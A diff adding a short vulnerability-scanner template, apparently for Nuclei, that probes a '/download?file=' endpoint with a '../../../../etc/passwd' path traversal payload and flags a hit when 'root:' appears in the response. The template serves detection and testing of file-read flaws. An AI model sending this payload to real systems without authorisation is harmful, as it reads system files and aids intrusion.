@@ -1,0 +1,13 @@
+id: path-traversal
+info:
+  name: Path Traversal
+  author: project-c
+  severity: high
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download?file=../../../../etc/passwd"
+    matchers:
+      - type: word
+        words:
+          - "root:"
